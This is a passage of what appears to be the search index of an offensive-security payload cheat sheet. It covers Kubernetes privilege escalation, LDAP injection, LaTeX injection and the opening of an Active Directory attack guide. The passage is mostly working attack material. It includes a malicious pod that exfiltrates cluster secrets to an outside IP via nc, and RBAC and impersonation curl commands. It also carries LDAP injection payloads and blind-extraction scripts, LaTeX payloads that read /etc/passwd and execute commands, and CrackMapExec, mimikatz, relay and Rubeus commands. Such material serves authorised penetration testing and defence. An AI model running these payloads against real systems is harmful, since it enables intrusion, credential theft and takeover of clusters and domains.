alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true Then kubectl apply -f malicious-pod.yaml","title":"Pod Creation"},{"location":"Kubernetes/#privilege-to-use-podsexec","text":"kubectl exec -it <POD NAME> -n <PODS NAMESPACE> \u2013- sh","title":"Privilege to Use Pods/Exec"},{"location":"Kubernetes/#privilege-to-getpatch-rolebindings","text":"The purpose of this JSON file is to bind the admin \"CluserRole\" to the compromised service account. Create a malicious RoleBinging.json file. { \"apiVersion\": \"rbac.authorization.k8s.io/v1\", \"kind\": \"RoleBinding\", \"metadata\": { \"name\": \"malicious-rolebinding\", \"namespcaes\": \"default\" }, \"roleRef\": { \"apiGroup\": \"*\", \"kind\": \"ClusterRole\", \"name\": \"admin\" }, \"subjects\": [ { \"kind\": \"ServiceAccount\", \"name\": \"sa-comp\" \"namespace\": \"default\" } ] } curl -k -v -X POST -H \"Authorization: Bearer <JWT TOKEN>\" -H \"Content-Type: application/json\" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json curl -k -v -X POST -H \"Authorization: Bearer <COMPROMISED JWT TOKEN>\" -H \"Content-Type: application/json\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret","title":"Privilege to Get/Patch Rolebindings"},{"location":"Kubernetes/#impersonating-a-privileged-account","text":"curl -k -v -XGET -H \"Authorization: Bearer <JWT TOKEN (of the impersonator)>\" -H \"Impersonate-Group: system:masters\" -H \"Impersonate-User: null\" -H \"Accept: application/json\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/","title":"Impersonating a Privileged Account"},{"location":"Kubernetes/#privileged-service-account-token","text":"$ cat /run/secrets/kubernetes.io/serviceaccount/token $ curl -k -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/","title":"Privileged Service Account Token"},{"location":"Kubernetes/#interesting-endpoints-to-reach","text":"# List Pods curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/pods/ # List secrets curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/ # List deployments curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/deployments # List daemonsets curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets","title":"Interesting endpoints to reach"},{"location":"Kubernetes/#api-addresses-that-you-should-know","text":"(External network visibility)","title":"API addresses that you should know"},{"location":"Kubernetes/#cadvisor","text":"curl -k https://<IP Address>:4194","title":"cAdvisor"},{"location":"Kubernetes/#insecure-api-server","text":"curl -k https://<IP Address>:8080","title":"Insecure API server"},{"location":"Kubernetes/#secure-api-server","text":"curl -k https://<IP Address>:(8|6)443/swaggerapi curl -k https://<IP Address>:(8|6)443/healthz curl -k https://<IP Address>:(8|6)443/api/v1","title":"Secure API Server"},{"location":"Kubernetes/#etcd-api","text":"curl -k https://<IP address>:2379 curl -k https://<IP address>:2379/version etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only","title":"etcd API"},{"location":"Kubernetes/#kubelet-api","text":"curl -k https://<IP address>:10250 curl -k https://<IP address>:10250/metrics curl -k https://<IP address>:10250/pods","title":"Kubelet API"},{"location":"Kubernetes/#kubelet-read-only","text":"curl -k https://<IP Address>:10255 http://<external-IP>:10255/pods","title":"kubelet (Read only)"},{"location":"Kubernetes/#references","text":"Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019 Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019 Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019 Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Kubernetes Pod Privilege Escalation","title":"References"},{"location":"LDAP%20Injection/","text":"LDAP injection LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy. Summary Exploitation Payloads Blind Exploitation Defaults attributes Exploiting userPassword attribute Scripts Discover valid LDAP fields Special blind LDAP injection Exploitation Example 1. user = *)(uid=*))(|(uid=* pass = password query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)) Example 2 user = admin)(!(&(1=0 pass = q)) query = (&(uid=admin)(!(&(1=0)(userPassword=q)))) Payloads * *)(& *))%00 )(cn=))\\x00 *()|%26' *()|&' *(|(mail=*)) *(|(objectclass=*)) *)(uid=*))(|(uid=* */* *| / // //* @* | admin* admin*)((|userpassword=*) admin*)((|userPassword=*) x' or name()='username' or 'x'='y Blind Exploitation We can extract using a bypass login (&(sn=administrator)(password=*)) : OK (&(sn=administrator)(password=A*)) : KO (&(sn=administrator)(password=B*)) : KO ... (&(sn=administrator)(password=M*)) : OK (&(sn=administrator)(password=MA*)) : KO (&(sn=administrator)(password=MB*)) : KO ... (&(sn=administrator)(password=MY*)) : OK (&(sn=administrator)(password=MYA*)) : KO (&(sn=administrator)(password=MYB*)) : KO (&(sn=administrator)(password=MYC*)) : KO ... (&(sn=administrator)(password=MYK*)) : OK (&(sn=administrator)(password=MYKE)) : OK Defaults attributes Can be used in an injection like *)(ATTRIBUTE_HERE=* userPassword surname name cn sn objectClass mail givenName commonName Exploiting userPassword attribute userPassword attribute is not a string like the cn attribute for example but it\u2019s an OCTET STRING In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18). octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit. userPassword:2.5.13.18:=\\xx (\\xx is a byte) userPassword:2.5.13.18:=\\xx\\xx userPassword:2.5.13.18:=\\xx\\xx\\xx Scripts Discover valid LDAP fields #!/usr/bin/python3 import requests import string fields = [] url = 'https://URL.com/' f = open('dic', 'r') #Open the wordlists of common attributes wordl = f.read().split('\\n') f.close() for i in wordl: r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\\x00)(password=bla)) if 'TRUE CONDITION' in r.text: fields.append(str(i)) print(fields) Ref. [5][5] Special blind LDAP injection (without \"*\") #!/usr/bin/python3 import requests, string alphabet = string.ascii_letters + string.digits + \"_@{}-/()!\\\"$%=^[]:;\" flag = \"\" for i in range(50): print(\"[i] Looking for number \" + str(i)) for char in alphabet: r = requests.get(\"http://ctf.web?action=dir&search=admin*)(password=\" + flag + char) if (\"TRUE CONDITION\" in r.text): flag += char print(\"[+] Flag: \" + flag) break Ref. [5][5] #!/usr/bin/env ruby require 'net/http' alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('') flag = '' (0..50).each do |i| puts(\"[i] Looking for number #{i}\") alphabet.each do |char| r = Net::HTTP.get(URI(\"http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}\")) if /TRUE CONDITION/.match?(r) flag += char puts(\"[+] Flag: #{flag}\") break end end end By noraj References OWASP LDAP Injection LDAP Blind Explorer ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN Quals ECW 2018 - Maki How To Manage and Use LDAP Servers with OpenLDAP Utilities How To Configure OpenLDAP and Perform Administrative LDAP Tasks SSH key authentication via LDAP How to setup LDAP server for openssh-lpk openssh-lpk.ldif Setting up OpenLDAP server with OpenSSH-LPK on Ubuntu 14.04 SSH key authentication using LDAP [FR] SSH et LDAP SSH Public Keys in OpenLDAP","title":"LDAP injection"},{"location":"LDAP%20Injection/#ldap-injection","text":"LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.","title":"LDAP injection"},{"location":"LDAP%20Injection/#summary","text":"Exploitation Payloads Blind Exploitation Defaults attributes Exploiting userPassword attribute Scripts Discover valid LDAP fields Special blind LDAP injection","title":"Summary"},{"location":"LDAP%20Injection/#exploitation","text":"Example 1. user = *)(uid=*))(|(uid=* pass = password query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)) Example 2 user = admin)(!(&(1=0 pass = q)) query = (&(uid=admin)(!(&(1=0)(userPassword=q))))","title":"Exploitation"},{"location":"LDAP%20Injection/#payloads","text":"* *)(& *))%00 )(cn=))\\x00 *()|%26' *()|&' *(|(mail=*)) *(|(objectclass=*)) *)(uid=*))(|(uid=* */* *| / // //* @* | admin* admin*)((|userpassword=*) admin*)((|userPassword=*) x' or name()='username' or 'x'='y","title":"Payloads"},{"location":"LDAP%20Injection/#blind-exploitation","text":"We can extract using a bypass login (&(sn=administrator)(password=*)) : OK (&(sn=administrator)(password=A*)) : KO (&(sn=administrator)(password=B*)) : KO ... (&(sn=administrator)(password=M*)) : OK (&(sn=administrator)(password=MA*)) : KO (&(sn=administrator)(password=MB*)) : KO ... (&(sn=administrator)(password=MY*)) : OK (&(sn=administrator)(password=MYA*)) : KO (&(sn=administrator)(password=MYB*)) : KO (&(sn=administrator)(password=MYC*)) : KO ... (&(sn=administrator)(password=MYK*)) : OK (&(sn=administrator)(password=MYKE)) : OK","title":"Blind Exploitation"},{"location":"LDAP%20Injection/#defaults-attributes","text":"Can be used in an injection like *)(ATTRIBUTE_HERE=* userPassword surname name cn sn objectClass mail givenName commonName","title":"Defaults attributes"},{"location":"LDAP%20Injection/#exploiting-userpassword-attribute","text":"userPassword attribute is not a string like the cn attribute for example but it\u2019s an OCTET STRING In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18). octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit. userPassword:2.5.13.18:=\\xx (\\xx is a byte) userPassword:2.5.13.18:=\\xx\\xx userPassword:2.5.13.18:=\\xx\\xx\\xx","title":"Exploiting userPassword attribute"},{"location":"LDAP%20Injection/#scripts","text":"","title":"Scripts"},{"location":"LDAP%20Injection/#discover-valid-ldap-fields","text":"#!/usr/bin/python3 import requests import string fields = [] url = 'https://URL.com/' f = open('dic', 'r') #Open the wordlists of common attributes wordl = f.read().split('\\n') f.close() for i in wordl: r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\\x00)(password=bla)) if 'TRUE CONDITION' in r.text: fields.append(str(i)) print(fields) Ref. [5][5]","title":"Discover valid LDAP fields"},{"location":"LDAP%20Injection/#special-blind-ldap-injection-without","text":"#!/usr/bin/python3 import requests, string alphabet = string.ascii_letters + string.digits + \"_@{}-/()!\\\"$%=^[]:;\" flag = \"\" for i in range(50): print(\"[i] Looking for number \" + str(i)) for char in alphabet: r = requests.get(\"http://ctf.web?action=dir&search=admin*)(password=\" + flag + char) if (\"TRUE CONDITION\" in r.text): flag += char print(\"[+] Flag: \" + flag) break Ref. [5][5] #!/usr/bin/env ruby require 'net/http' alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('') flag = '' (0..50).each do |i| puts(\"[i] Looking for number #{i}\") alphabet.each do |char| r = Net::HTTP.get(URI(\"http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}\")) if /TRUE CONDITION/.match?(r) flag += char puts(\"[+] Flag: #{flag}\") break end end end By noraj","title":"Special blind LDAP injection (without \"*\")"},{"location":"LDAP%20Injection/#references","text":"OWASP LDAP Injection LDAP Blind Explorer ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN Quals ECW 2018 - Maki How To Manage and Use LDAP Servers with OpenLDAP Utilities How To Configure OpenLDAP and Perform Administrative LDAP Tasks SSH key authentication via LDAP How to setup LDAP server for openssh-lpk openssh-lpk.ldif Setting up OpenLDAP server with OpenSSH-LPK on Ubuntu 14.04 SSH key authentication using LDAP [FR] SSH et LDAP SSH Public Keys in OpenLDAP","title":"References"},{"location":"LaTeX%20Injection/","text":"LaTex Injection Read file Read file and interpret the LaTeX code in it: \\input{/etc/passwd} \\include{somefile} # load .tex file (somefile.tex) Read single lined file: \\newread\\file \\openin\\file=/etc/issue \\read\\file to\\line \\text{\\line} \\closein\\file Read multiple lined file: \\newread\\file \\openin\\file=/etc/passwd \\loop\\unless\\ifeof\\file \\read\\file to\\fileline \\text{\\fileline} \\repeat \\closein\\file Read text file, without interpreting the content, it will only paste raw file content: \\usepackage{verbatim} \\verbatiminput{/etc/passwd} If injection point is past document header ( \\usepackage cannot be used), some control characters can be deactivated in order to use \\input on file containing $ , # , _ , & , null bytes, ... (eg. perl scripts). \\catcode `\\$=12 \\catcode `\\#=12 \\catcode `\\_=12 \\catcode `\\&=12 \\input{path_to_script.pl} Write file Write single lined file: \\newwrite\\outfile \\openout\\outfile=cmd.tex \\write\\outfile{Hello-world} \\write\\outfile{Line 2} \\write\\outfile{I like trains} \\closeout\\outfile Command execution The output of the command will be redirected to stdout, therefore you need to use a temp file to get it. \\immediate\\write18{id > output} \\input{output} If you get any LaTex error, consider using base64 to get the result without bad characters (or use \\verbatiminput ): \\immediate\\write18{env | base64 > test.tex} \\input{text.tex} \\input|ls|base64 \\input{|\"/bin/hostname\"} Cross Site Scripting From @EdOverflow \\url{javascript:alert(1)} \\href{javascript:alert(1)}{placeholder} Live example at http://payontriage.com/xss.php?xss=$\\href{javascript:alert(1)}{Frogs%20find%20bugs}$ References Hacking with LaTeX - Sebastian Neef - 0day.work Latex to RCE, Private Bug Bounty Program - Yasho Pwning coworkers thanks to LaTeX","title":"LaTex Injection"},{"location":"LaTeX%20Injection/#latex-injection","text":"","title":"LaTex Injection"},{"location":"LaTeX%20Injection/#read-file","text":"Read file and interpret the LaTeX code in it: \\input{/etc/passwd} \\include{somefile} # load .tex file (somefile.tex) Read single lined file: \\newread\\file \\openin\\file=/etc/issue \\read\\file to\\line \\text{\\line} \\closein\\file Read multiple lined file: \\newread\\file \\openin\\file=/etc/passwd \\loop\\unless\\ifeof\\file \\read\\file to\\fileline \\text{\\fileline} \\repeat \\closein\\file Read text file, without interpreting the content, it will only paste raw file content: \\usepackage{verbatim} \\verbatiminput{/etc/passwd} If injection point is past document header ( \\usepackage cannot be used), some control characters can be deactivated in order to use \\input on file containing $ , # , _ , & , null bytes, ... (eg. perl scripts). \\catcode `\\$=12 \\catcode `\\#=12 \\catcode `\\_=12 \\catcode `\\&=12 \\input{path_to_script.pl}","title":"Read file"},{"location":"LaTeX%20Injection/#write-file","text":"Write single lined file: \\newwrite\\outfile \\openout\\outfile=cmd.tex \\write\\outfile{Hello-world} \\write\\outfile{Line 2} \\write\\outfile{I like trains} \\closeout\\outfile","title":"Write file"},{"location":"LaTeX%20Injection/#command-execution","text":"The output of the command will be redirected to stdout, therefore you need to use a temp file to get it. \\immediate\\write18{id > output} \\input{output} If you get any LaTex error, consider using base64 to get the result without bad characters (or use \\verbatiminput ): \\immediate\\write18{env | base64 > test.tex} \\input{text.tex} \\input|ls|base64 \\input{|\"/bin/hostname\"}","title":"Command execution"},{"location":"LaTeX%20Injection/#cross-site-scripting","text":"From @EdOverflow \\url{javascript:alert(1)} \\href{javascript:alert(1)}{placeholder} Live example at http://payontriage.com/xss.php?xss=$\\href{javascript:alert(1)}{Frogs%20find%20bugs}$","title":"Cross Site Scripting"},{"location":"LaTeX%20Injection/#references","text":"Hacking with LaTeX - Sebastian Neef - 0day.work Latex to RCE, Private Bug Bounty Program - Yasho Pwning coworkers thanks to LaTeX","title":"References"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/","text":"Active Directory Attacks Summary Active Directory Attacks Summary Tools Active Directory Recon Using BloodHound Using PowerView Using AD Module Most common paths to AD compromise MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability) From CVE to SYSTEM shell on DC ZeroLogon PrintNightmare samAccountName spoofing Open Shares SCF and URL file attack against writeable share SCF Files URL Files Windows Library Files Windows Search Connectors Files Passwords in SYSVOL & Group Policy Preferences Exploit Group Policy Objects GPO Find vulnerable GPO Abuse GPO with SharpGPOAbuse Abuse GPO with PowerGPOAbuse Abuse GPO with pyGPOAbuse Abuse GPO with PowerView Abuse GPO with StandIn Dumping AD Domain Credentials Using ndtsutil Using Vshadow Using vssadmin Using DiskShadow (a Windows signed binary) Using esentutl.exe Extract hashes from ntds.dit Alternatives - modules Using Mimikatz DCSync Using Mimikatz sekurlsa Crack NTLM hashes with hashcat User Hunting Password spraying Kerberos pre-auth bruteforcing Spray a pre-generated passwords list Spray passwords against the RDP service BadPwdCount attribute Password in AD User comment Password of Pre-Created Computer Account Reading LAPS Password Reading GMSA Password Forging Golden GMSA Pass-the-Ticket Golden Tickets Using Mimikatz Using Meterpreter Using a ticket on Linux Pass-the-Ticket Silver Tickets Kerberoasting KRB_AS_REP Roasting Pass-the-Hash OverPass-the-Hash (pass the key) Using impacket Using Rubeus Capturing and cracking Net-NTLMv1/NTLMv1 hashes Capturing and cracking Net-NTLMv2/NTLMv2 hashes Man-in-the-Middle attacks & relaying MS08-068 NTLM reflection SMB Signing Disabled and IPv4 SMB Signing Disabled and IPv6 Drop the MIC Ghost Potato - CVE-2019-1384 RemotePotato0 DCOM DCE RPC relay DNS Poisonning - Relay delegation with mitm6 Relaying with WebDav Trick Active Directory Certificate Services ESC1 - Misconfigured Certificate Templates ESC2 - Misconfigured Certificate Templates ESC3 - Misconfigured Enrollment Agent Templates ESC4 - Access Control Vulnerabilities ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ESC7 - Vulnerable Certificate Authority Access Control ESC8 - AD CS Relay Attack Certifried CVE-2022-26923 Pass-The-Certificate UnPAC The Hash Shadow Credentials Dangerous Built-in Groups Usage Abusing DNS Admins Group Abusing Active Directory ACLs/ACEs GenericAll GenericWrite GenericWrite and Remote Connection Manager WriteDACL WriteOwner ReadLAPSPassword ReadGMSAPassword ForceChangePassword DCOM Exploitation DCOM via MMC Application Class DCOM via Excel DCOM via ShellExecute Trust relationship between domains Child Domain to Forest Compromise - SID Hijacking Forest to Forest Compromise - Trust Ticket Privileged Access Management (PAM) Trust Kerberos Unconstrained Delegation SpoolService Abuse with Unconstrained Delegation MS-EFSRPC Abuse with Unconstrained Delegation Kerberos Constrained Delegation Kerberos Resource Based Constrained Delegation Kerberos Bronze Bit Attack - CVE-2020-17049 PrivExchange attack SCCM Deployment WSUS Deployment RODC - Read Only Domain Controller Compromise PXE Boot image attack DSRM Credentials DNS Reconnaissance Impersonating Office 365 Users on Azure AD Connect Linux Active Directory CCACHE ticket reuse from /tmp CCACHE ticket reuse from keyring CCACHE ticket reuse from SSSD KCM CCACHE ticket reuse from keytab Extract accounts from /etc/krb5.keytab References Tools Impacket or the Windows version Responder InveighZero Mimikatz Ranger AdExplorer CrackMapExec ```powershell # use the latest release, CME is now a binary packaged will all its dependencies root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip # execute cme (smb, winrm, mssql, ...) root@payload$ cme smb -L root@payload$ cme smb -M name_module -o VAR=DATA root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443 root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" -M web_delivery -o URL=\"https://IP:PORT/posh-payload\" root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method smbexec -X 'whoami' root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz root@payload$ cme mimikatz --server http --server-port 80 ``` Mitm6 bash git clone https://github.com/fox-it/mitm6.git && cd mitm6 pip install . mitm6 -d lab.local ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i # -wh: Server hosting WPAD file (Attacker\u2019s IP) # -t: Target (You cannot relay credentials to the same device that you\u2019re spoofing) # -i: open an interactive shell ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access ADRecon powershell .\\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\\myuser Active Directory Assessment and Privilege Escalation Script powershell powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 Ping Castle powershell pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession pingcastle.exe --healthcheck --server domain.local pingcastle.exe --graph --server domain.local pingcastle.exe --scanner scanner_name --server domain.local available scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users Kerbrute powershell ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD> Rubeus powershell Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid] Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID] Rubeus.exe klist [/luid:LOGINID] Rubeus.exe kerberoast [/spn:\"blah/blah\"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] AutomatedLab powershell New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD' Install-Lab Show-LabDeploymentSummary Active Directory Recon Using BloodHound Use the correct collector * AzureHound for Azure Active Directory * SharpHound for local Active Directory use AzureHound powershell # require: Install-Module -name Az -AllowClobber # require: Install-Module -name AzureADPreview -AllowClobber Connect-AzureAD Connect-AzAccount . .\\AzureHound.ps1 Invoke-AzureHound use BloodHound ```powershell # run the collector on the machine using SharpHound.exe # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .\\SharpHound.exe -c all -d active.htb --searchforest .\\SharpHound.exe -c all,GPOLocalGroup # all collection doesn't include GPOLocalGroup by default .\\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn't query the computers (more stealthy) .\\SharpHound.exe -c all --LdapUsername --LdapPassword --JSONFolder .\\SharpHound.exe -c all --LdapUsername --LdapPassword --domaincontroller 10.10.10.100 -d active.htb .\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23 # or run the collector on the machine using Powershell # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 Invoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public Invoke-BloodHound -CollectionMethod All -LDAPUser -LDAPPass -OutputDirectory # or remotely via BloodHound Python # https://github.com/fox-it/BloodHound.py pip install bloodhound bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all * Collect more data for certificates exploitation using Certipy ps1 certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound ``` Then import the zip/json files into the Neo4J database and query them. root@payload$ apt install bloodhound # start BloodHound and the database root@payload$ neo4j console # or use docker root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j root@payload$ ./bloodhound --no-sandbox Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j You can add some custom queries like : * Bloodhound-Custom-Queries from @hausec * BloodHoundQueries from CompassSecurity * BloodHound Custom Queries from Exegol - @ShutdownRepo * Certipy BloodHound Custom Queries from ly4k Replace the customqueries.json file located at /home/username/.config/bloodhound/customqueries.json or C:\\Users\\USERNAME\\AppData\\Roaming\\BloodHound\\customqueries.json . Using PowerView Get Current Domain: Get-NetDomain Enum Other Domains: Get-NetDomain -Domain <DomainName> Get Domain SID: Get-DomainSID Get Domain Policy: ```powershell Get-DomainPolicy #Will show us the policy configurations of the Domain about system access or kerberos (Get-DomainPolicy).\"system access\" (Get-DomainPolicy).\"kerberos policy\" - **Get Domain Controlers:** powershell Get-NetDomainController Get-NetDomainController -Domain - **Enumerate Domain Users:** powershell Get-NetUser Get-NetUser -SamAccountName Get-NetUser | select cn Get-UserProperty #Check last password change Get-UserProperty -Properties pwdlastset #Get a spesific \"string\" on a user's attribute Find-UserField -SearchField Description -SearchTerm \"wtver\" #Enumerate user logged on a machine Get-NetLoggedon -ComputerName #Enumerate Session Information for a machine Get-NetSession -ComputerName #Enumerate domain machines of the current/specified domain where specific users are logged into Find-DomainUserLocation -Domain | Select-Object UserName, SessionFromName - **Enum Domain Computers:** powershell Get-NetComputer -FullData Get-DomainGroup #Enumerate Live machines Get-NetComputer -Ping - **Enum Groups and Group Members:** powershell Get-NetGroupMember -GroupName \" \" -Domain #Enumerate the members of a specified group of the domain Get-DomainGroup -Identity | Select-Object -ExpandProperty Member #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName - **Enumerate Shares** powershell #Enumerate Domain Shares Find-DomainShare #Enumerate Domain Shares the current user has access Find-DomainShare -CheckShareAccess - **Enum Group Policies:** powershell Get-NetGPO # Shows active Policy on specified machine Get-NetGPO -ComputerName Get-NetGPOGroup #Get users that are part of a Machine's local Admin group Find-GPOComputerAdmin -ComputerName - **Enum OUs:** powershell Get-NetOU -FullData Get-NetGPO -GPOname - **Enum ACLs:** powershell # Returns the ACLs associated with the specified account Get-ObjectAcl -SamAccountName -ResolveGUIDs Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose #Search for interesting ACEs Invoke-ACLScanner -ResolveGUIDs #Check the ACLs associated with a specified path (e.g smb share) Get-PathAcl -Path \"\\Path\\Of\\A\\Share\" - **Enum Domain Trust:** powershell Get-NetDomainTrust Get-NetDomainTrust -Domain - **Enum Forest Trust:** powershell Get-NetForestDomain Get-NetForestDomain Forest #Domains of Forest Enumeration Get-NetForestDomain Get-NetForestDomain Forest #Map the Trust of the Forest Get-NetForestTrust Get-NetDomainTrust -Forest - **User Hunting:** powershell #Finds all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose #Find local admins on all machines of the domain: Invoke-EnumerateLocalAdmin -Verbose #Find computers were a Domain Admin OR a specified user has a session Invoke-UserHunter Invoke-UserHunter -GroupName \"RDPUsers\" Invoke-UserHunter -Stealth #Confirming admin access: Invoke-UserHunter -CheckAccess ``` :heavy_exclamation_mark: Priv Esc to Domain Admin with User Hunting: \\ I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit! PowerView 3.0 Tricks Using AD Module Get Current Domain: Get-ADDomain Enum Other Domains: Get-ADDomain -Identity <Domain> Get Domain SID: Get-DomainSID Get Domain Controlers: powershell Get-ADDomainController Get-ADDomainController -Identity <DomainName> Enumerate Domain Users: ```powershell Get-ADUser -Filter * -Identity -Properties * #Get a spesific \"string\" on a user's attribute Get-ADUser -Filter 'Description -like \" wtver \"' -Properties Description | select Name, Description - **Enum Domain Computers:** powershell Get-ADComputer -Filter * -Properties * Get-ADGroup -Filter * - **Enum Domain Trust:** powershell Get-ADTrust -Filter * Get-ADTrust -Identity - **Enum Forest Trust:** powershell Get-ADForest Get-ADForest -Identity #Domains of Forest Enumeration (Get-ADForest).Domains - **Enum Local AppLocker Effective Policy:** powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections ``` Other Interesting Commands Find Domain Controllers ps1 nslookup domain.com nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>.com nltest /dclist:domain.com Get-ADDomainController -filter * | Select-Object name gpresult /r $Env:LOGONSERVER echo %LOGONSERVER% Most common paths to AD compromise MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability) This exploit require to know the user SID, you can use rpcclient to remotely get it or wmi if you have an access on the machine. # remote rpcclient $> lookupnames john.smith john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1) # loc wmic useraccount get name,sid Administrator S-1-5-21-3415849876-833628785-5197346142-500 Guest S-1-5-21-3415849876-833628785-5197346142-501 Administrator S-1-5-21-297520375-2634728305-5197346142-500 Guest S-1-5-21-297520375-2634728305-5197346142-501 krbtgt S-1-5-21-297520375-2634728305-5197346142-502 lambda S-1-5-21-297520375-2634728305-5197346142-1110 # powerview Convert-NameToSid high-sec-corp.localkrbtgt S-1-5-21-2941561648-383941485-1389968811-502 Doc: 